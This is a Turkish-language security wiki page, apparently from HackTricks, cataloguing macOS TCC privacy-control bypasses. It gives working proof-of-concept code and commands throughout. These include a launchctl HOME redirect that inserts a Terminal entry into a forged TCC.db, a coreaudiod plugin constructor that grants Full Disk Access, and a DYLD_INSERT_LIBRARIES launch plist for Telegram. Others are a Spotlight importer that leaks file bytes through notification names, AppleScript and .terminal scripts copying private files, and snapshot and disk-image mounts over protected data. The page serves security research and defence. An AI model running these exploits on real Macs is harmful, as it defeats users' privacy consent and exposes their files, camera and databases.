# macOS TCC Bypass'ları

{{#include ../../../../../banners/hacktricks-training.md}}

TCC izinlerinin depolanması ve Automation gönderen/hedef ilişkilendirmesi için [macOS TCC genel bakışına](../index.html#identify-apple-events-sender-and-target-grants) bakın.

## İşlevselliğe göre

### Yazma Bypass'ı

Bu bir bypass değil, yalnızca TCC'nin çalışma şekli: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma izni olmasa bile oraya yazabilir**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

The **extended attribute `com.apple.macl`**, yeni **file**'a eklenerek **creator app**'e dosyayı okuma erişimi verir.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC isteminin üzerine bir pencere yerleştirmek** mümkündür. PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.** adresinde bulabilirsiniz.<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Rastgele adla TCC isteği

Saldırgan, **`Info.plist` içinde herhangi bir adla** (ör. Finder, Google Chrome...) **uygulamalar oluşturabilir** ve bu uygulamalardan TCC korumalı bir konuma erişim istemelerini sağlayabilir. Kullanıcı, erişimi isteyenin meşru uygulama olduğunu düşünecektir.\
Ayrıca, **meşru uygulamayı Dock'tan kaldırıp yerine sahte olanı koymak** mümkündür. Böylece kullanıcı sahte olana tıkladığında (aynı simgeyi kullanabilir) sahte uygulama meşru olanı çağırabilir, TCC izinlerini isteyebilir ve bir malware çalıştırarak kullanıcıya erişimi meşru uygulamanın istediğini düşündürebilir.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access"e sahipti**. Bunu devre dışı bırakmak için SSH'nin listede yer alması ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Bazı **malware'lerin bu korumayı nasıl aşabildiğine** dair örnekleri burada bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> SSH'yi etkinleştirebilmek için artık **Full Disk Access** gerektiğini unutmayın.

### Uzantıları işleme - CVE-2022-26767

**`com.apple.macl`** özniteliği, **belirli bir uygulamaya dosyayı okuma izni vermek** için dosyalara eklenir. Bu öznitelik, bir dosya uygulamanın üzerine **sürüklenip bırakıldığında** veya kullanıcı bir dosyayı **varsayılan uygulamayla** açmak için **çift tıkladığında** ayarlanır.

Dolayısıyla bir kullanıcı, tüm uzantıları işlemek için **kötü amaçlı bir uygulama kaydedebilir** ve Launch Services'i çağırarak herhangi bir dosyayı **açabilir** (böylece kötü amaçlı dosyaya dosyayı okuma erişimi verilir).<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı sayesinde, **iCloud token'ları sağlayan** **`com.apple.iCloudHelper`** XPC service'iyle iletişim kurmak mümkündür.

**iMovie** ve **Garageband** bu entitlement'a ve izin veren başka entitlement'lara sahipti.

Bu entitlement üzerinden **iCloud token'larını alma** exploit'i hakkında daha fazla **bilgi** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Darwin notification adları üzerinden Spotlight importer leakage

Bir Spotlight importer, Full Disk Access'i olmayan normal bir process dosyayı okuyamasa bile Spotlight'ın `GetMetadataForFile` callback'ine ilettiği dosyayı okuyabilir. [TCC yetkili bir process'e code injection](../macos-tcc-credential-and-data-theft.md) yönteminden farklı olarak bu yöntem, bir importer yükleyebilen ve eşleşen bir Spotlight indexing event'ini tetikleyebilen yerel bir foothold gerektirir. Importer sandbox içindedir; ancak yalnızca ad içeren Darwin notification'lar, bu sandbox'ın dışındaki bir listener'a byte'lar taşıyabilir. Bu, importer'dan root erişimine veya rastgele dosyalara erişime giden bir yol değil, bir data-leak channel'ıdır.<sup>[[24]](#references)</sup>

Hedef dosya türünü importer's `Info.plist` dosyasında `CFBundleDocumentTypes` → `LSItemContentTypes` altında tanımlayın, ardından bundle'ı `~/Library/Spotlight/` veya bir uygulamanın `Contents/Library/Spotlight/` dizinine yükleyin. Kaydı `mdimport -L` ile kontrol edin. [Spotlight importer bölümü](../../../../macos-auto-start-locations.md#spotlight-plugins), bundle'ın konumlandırılması ve dosya türü eşleştirmesini açıklar. Importer yalnızca Spotlight'ın kendisini seçtiği dosyaları alır; genellikle mevcut bir importer önceliklidir. macOS 26 Tahoe'da, bildirilen testlerde `mdimport -i` komutu anında özyinelemeli indexing işlemini güvenilir biçimde zorlamadı; `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ise bu importer'ın sahip olduğunu belirttiği UTI'ların yeniden import edilmesini istedi.<sup>[[24]](#references)</sup>

Bir channel testi için sandbox dışındaki bir listener'ı `notifyutil -w TEST_TEST_TEST` ile başlatın; ardından `CFNotificationCenterGetDarwinNotifyCenter()` ile `NULL` object ve `userInfo` kullanarak bir notification gönderin. `userInfo` payload'ı taşıyan distributed notification'ın aksine, Darwin notification yalnızca adını taşır. Binary data için `notify_register_dispatch` kullanarak dış listener'ı `0` ile `255` arasındaki ondalık adlara kaydedin; her callback'in kaydını karşılık gelen byte değerine eşleyin. `GetMetadataForFile` içinde yalnızca Spotlight'ın sağladığı `pathToFile` dosyasını okuyun ve her byte'ı ondalık bir notification adı olarak gönderin:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Dinleyici, TCC korumalı dosyanın kendisini okumak yerine bayt dizisini yeniden oluşturur. Yayımlanan PoC, SIP etkinken macOS 26'da FDA izni olmayan bir terminalden `knowledgeC.db` dosyasının ilk 64 baytını kurtardı. Bu yöntem düşük bant genişliklidir ve toplu kopyalama için güvenilir değildir: Spotlight hedef dosyayı dizine eklemeyebilir veya yeniden dizine eklemeyebilir; eşzamanlı importer örnekleri bildirim akışlarını iç içe geçirebilir. Sandbox sınırı mekanizmaları hakkında daha fazla bilgi için [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) bölümüne bakın.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** iznine sahip bir uygulama **diğer uygulamaları kontrol edebilir**. Bu, **diğer uygulamalara verilen izinleri kötüye kullanabileceği** anlamına gelir.<sup>[[2]](#references)</sup>

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir uygulamanın **`iTerm` üzerinde Automation izni** varsa, bu örnekte **`Terminal` iTerm'e erişebilir**:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm üzerinden

FDA izni olmayan Terminal, bu izne sahip iTerm'i çağırıp işlemler gerçekleştirmek için kullanabilir:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Finder Üzerinden

Veya bir uygulamanın Finder üzerinden erişimi varsa, bunun gibi bir script çalıştırabilir:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Uygulamaya göre davranış

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanındaki **tccd daemon**, TCC kullanıcı veritabanına şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[Bu Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemon'ı mevcut kullanıcının etki alanında `launchd` aracılığıyla çalıştığı için, kendisine aktarılan **tüm ortam değişkenlerini kontrol etmek** mümkündür.<sup>[[19]](#references)</sup>\
Böylece bir **saldırgan**, **`launchctl`** içinde **`$HOME` ortam** değişkenini **kontrol ettiği** bir **dizini** gösterecek şekilde ayarlayabilir, **TCC** daemon'ını **yeniden başlatabilir** ve son kullanıcıdan hiçbir zaman izin istemeden **TCC veritabanını doğrudan değiştirerek** kendisine **kullanılabilir tüm TCC yetkilerini** verebilir.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes, TCC tarafından korunan konumlara erişebiliyordu ancak yeni oluşturulan bir not **korunmayan bir konumda saklanıyordu**. Bu nedenle saldırgan, Notes'tan korunan bir dosyayı nota kopyalamasını isteyebilir ve ardından ortaya çıkan verilere korunmayan konumdan erişebilirdi:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesini kullanan `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmek için **`kTCCServiceSystemPolicyAllFiles`** içeren `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library" öğesine quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve böylece Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna eşlemek mümkündü; bu konumda Library içindeki tüm belgelere **erişilebilirdi**.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a (burada **`fileproviderd`** / `Files.app`) devreden uygulamalar, öğeleri **kullanıcı adına** kopyalar veya taşır; dolayısıyla kopyalama, çağıranın değil helper'ın yetkileriyle çalışır.

Jamf Threat Labs, işlemden önce yapılan symlink doğrulamasının **race edilebildiğini** gösterdi: saldırgan symlink'i (kontrol edilen) yolun **son** bileşenine yerleştirmek yerine, kopyalama başladıktan **sonra** yolun bir **ara** dizinini değiştirir. Ardından privileged helper, saldırganın kontrolündeki bağlantıyı izler ve hiçbir zaman bir prompt göstermeden TCC tarafından korunan konumları okur/yazar.<sup>[[5]](#references)</sup>

Yollarında rastgele UUID ile korunmayan dizinler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü saldırgan race için gereken tam yolu tahmin edebilir.

> [!TIP]
> Aranması gereken genel örüntü şudur: **bir yolu birden fazla kez çözen her privileged process** (check-then-use veya kaynak ve hedefi ayrı ayrı çözen `rename()`/`copyfile()`) yolun ortasındaki bir dizin değiştirilerek race edilebilir. Bu açığı yalnızca `O_NOFOLLOW_ANY`, önceden açılmış bir dizin FD'si üzerinde `openat()` veya `realpath()` + yeniden doğrulama gerçekten kapatır.

Daha fazla bilgi için [**Jamf Threat Labs yazısı**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'ları tarafından yönlendirilen bir logging hook'u ekleyen `SQLITE_ENABLE_SQLLOG` ile derlenebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database için**, database dosyasının bir **kopyası** ve SQL ifadelerinin bir log'u `path` içine yazılır (dizinin önceden mevcut olması gerekir).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – yeniden kullanmak yerine bir DB her açıldığında/eklendiğinde **yeni bir kopya** oluşturur.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında `<database>-sqllog` dosyası varsa bağlantıyı log'lar.

Bu variable'ı **FDA** yetkisine sahip ve SQLite database'leri açan bir process'e enjekte edebilirseniz, korunan database'leri kontrolünüzdeki bir dizine **kopyalar**. Hedef dosya adı saldırganın kontrolündeki verilerden türetildiği için, hedefte önceden oluşturulmuş bir **symlink** aynı yöntemi hedef process'in yetkileriyle **keyfi dosya yazma** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

**`SQLITE_AUTO_TRACE`** environment variable'ı ayarlanırsa **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **log'lamaya** başlar. Birçok uygulama bu kütüphaneyi kullandığından tüm SQLite sorgularını log'lamak mümkündü.<sup>[[22]](#references)</sup>

Apple'ın çeşitli uygulamaları, TCC tarafından korunan bilgilere erişmek için bu kütüphaneyi kullanıyordu.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### env-var ile yönlendirilen dosya yazma işlemlerini araştırma

Önceki iki örnek aynı genel tekniğin örnekleridir ve benzerlerini araştırmaya değer: **TCC ayrıcalıklarına sahip uygulamalara yüklenen framework'ler, çoğu zaman sürecin çağıranın kontrol ettiği bir yolda dosya oluşturmasını sağlayan debug/logging environment variable'ları sunar**.

Bunları bulmak için izlenecek yol:

1. FDA veya başka cazip bir TCC iznine sahip bir hedef seçin (`Music`, `TV`, `Terminal`, MDM agent'ları...) ve bağlandığı framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` dizelerini grep ile arayın: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Aday değişkenleri `launchctl setenv NAME /path/you/control` ile ayarlayın, uygulamayı başlatın ve dosya sistemindeki davranışını `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile izleyin.
4. Süreç dizininizde bir dosya **oluşturuyor veya yeniden adlandırıyorsa**, elinizde bir yazma primitive'i vardır: hedefi bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131'de olduğu gibi bir ara dizin üzerinde race gerçekleştirin) ve işlemi `~/Library/Application Support/com.apple.TCC/TCC.db` yoluna yönlendirin.

> [!TIP]
> Bu yöntemi sınırlayan iki şey var. Birincisi, uygulama [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) yetkisiyle dağıtılmadığı sürece, **`DYLD_*` değişkenleri hardened runtime kullanan ikililer tarafından yok sayılır** ("uygulamanın, uygulamanın sürecine kod enjekte etmek için kullanabileceğiniz dynamic linker environment variable'larından etkilenip etkilenemeyeceğini belirten bir Boolean değer") — ayrıca bkz. [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). İkincisi, Apple bildirildikçe framework'lere ait debug değişkenlerini tek tek kaldırır; bu nedenle bir macOS sürümünde çalışan bir değişken çoğu zaman sonraki sürümde artık yoktur. Bir değişkeni ayarladıktan sonra uygulama sessizce başlatmayı reddederse, bu değişkenin filtrelenmiş olduğunu varsayın.<sup>[[7]](#references)[[8]](#references)</sup>

Linker değişkenleriyle yapılan eşdeğer numara için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) sayfasına bakın.

### Apple Remote Desktop

Root olarak bu servisi etkinleştirebilirsiniz; **ARD agent'ı tam disk erişimine sahip olur** ve bir kullanıcı bu erişimi kötüye kullanarak yeni bir **TCC kullanıcı veritabanı** kopyalamasını sağlayabilir.

## NFSHomeDirectory ile

TCC, kullanıcıya özgü kaynaklara erişimi denetlemek için kullanıcının HOME klasöründe bir veritabanı kullanır: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Bu nedenle, kullanıcı TCC'yi **farklı bir klasörü** gösteren bir $HOME env değişkeniyle yeniden başlatabilirse, **/Library/Application Support/com.apple.TCC/TCC.db** konumunda yeni bir TCC veritabanı oluşturabilir ve TCC'yi herhangi bir uygulamaya herhangi bir TCC izni vermesi için kandırabilir.

> [!TIP]
> Apple, **`$HOME`** değerini belirlerken kullanıcının profilinde **`NFSHomeDirectory`** niteliğinde saklanan ayarı kullanır. Bu nedenle, bu değeri değiştirme izni olan bir uygulamayı (**`kTCCServiceSystemPolicySysAdminFiles`**) ele geçirirseniz, bir TCC bypass için bu seçeneği **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, kullanıcının **HOME** klasörünü değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Hedef uygulama için bir _csreq_ blob'u alın.
2. Gerekli erişimi ve _csreq_ blob'unu içeren sahte bir _TCC.db_ dosyası yerleştirin.
3. Kullanıcının Directory Services girdisini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile dışa aktarın.
4. Kullanıcının home dizinini değiştirmek için Directory Services girdisini düzenleyin.
5. Düzenlenmiş Directory Services girdisini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile içe aktarın.
6. Kullanıcının _tccd_ sürecini durdurun ve süreci yeniden başlatın.

İkinci POC, değeri `kTCCServiceSystemPolicySysAdminFiles` olan `com.apple.private.tcc.allow` yetkisine sahip **`/usr/libexec/configd`** dosyasını kullandı.\
**`configd`** dosyasını **`-t`** seçeneğiyle çalıştırmak mümkündü; böylece saldırgan **yüklenecek özel bir Bundle** belirtebiliyordu. Bu nedenle exploit, kullanıcının home dizinini değiştirmek için kullanılan **`dsexport`** ve **`dsimport`** yönteminin yerine **`configd` code injection** kullanır.

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) bakın.<sup>[[11]](#references)</sup>

## Process injection ile

Bir sürece kod enjekte etmek ve TCC ayrıcalıklarını kötüye kullanmak için farklı teknikler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ayrıca, TCC'yi bypass etmek için bulunan en yaygın process injection yöntemi **plugin'ler (load library)** kullanmaktır.\
Plugin'ler, genellikle library veya plist biçimindeki ek kodlardır; **ana uygulama tarafından yüklenir** ve onun bağlamında çalıştırılır. Bu nedenle, ana uygulama TCC kısıtlamalı dosyalara erişebiliyorsa (verilen izinler veya entitlement'lar aracılığıyla), **özel kod da bu erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` uygulaması **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** uzantılı plugin'ler yüklüyordu ve **hardened runtime kullanmıyordu**.

Bu CVE'yi weaponize etmek için, TCC'yi bypass edip **kullanıcının TCC veritabanını ele geçirmek** üzere (önceki entitlement'ı kötüye kullanarak) **`NFSHomeDirectory`** değiştirilir.

Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bakın.<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** ikilisi `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin veriyor**, ikincisi ise **TCC'yi yönetme erişimi** sağlıyordu.

Bu ikili, `/Library/Audio/Plug-Ins/HAL` klasöründen **üçüncü taraf plug-in'ler** yükleyebiliyordu. Dolayısıyla, bu POC ile bir **plugin yüklemek ve TCC izinlerini kötüye kullanmak** mümkündü:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) göz atın.<sup>[[13]](#references)</sup>

### Aygıt Soyutlama Katmanı (DAL) Eklentileri

Core Media I/O aracılığıyla kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** kullanan uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumundaki bu eklentileri **işlem içinde yükler** (SIP kısıtlamasına tabi değildir).

Oraya, yaygın **constructor**'ı içeren bir kitaplık eklemek **code injection** için yeterlidir.

Bazı Apple uygulamaları bu zafiyetten etkileniyordu.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkileri bulunuyordu:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Bu konuda kolayca nasıl exploit edileceği hakkında daha fazla bilgi için [**orijinal rapora göz atın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlement'larına sahipti. Bu sayede sürece kod enjekte etmek ve TCC ayrıcalıklarını kullanmak mümkündü.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlement'larına sahipti. Bu nedenle, kamera kaydı gibi **izinlerine erişmek** için uygulamayı kötüye kullanmak mümkündü. [**Payload'ı yazıda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Bir kütüphaneyi yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: bu kütüphaneyi enjekte etmek amacıyla **özel bir plist** oluşturuldu ve kütüphaneyi başlatmak için **`launchctl`** kullanıldı:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Açık çağrılarla

Sandbox içindeyken bile **`open`** çağrılabilir

### Terminal Script'leri

Terminal'e **Full Disk Access (FDA)** vermek, özellikle teknolojiyle ilgilenen kişilerin kullandığı bilgisayarlarda oldukça yaygındır. Ayrıca **`.terminal`** script'lerini bu yetkiyle çağırmak da mümkündür.

**`.terminal`** script'leri, yürütülecek komutun **`CommandString`** anahtarında bulunduğu şu örnekteki gibi plist dosyalarıdır:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Bir uygulama, /tmp gibi bir konuma bir terminal betiği yazabilir ve bunu şu tür bir komutla başlatabilir:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Mount ederek

### CVE-2020-9771 - mount_apfs TCC bypass ve yetki yükseltme

**Herhangi bir kullanıcı** (yetkisiz kullanıcılar bile) bir Time Machine snapshot'ı oluşturup bağlayabilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gerekli **tek ayrıcalık**, kullanılan uygulamanın (`Terminal` gibi) bir yönetici tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyasının üzerine mount etme

TCC DB dosyası korumalı olsa bile, dizinin üzerine yeni bir TCC.db dosyası **mount etmek** mümkündü:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
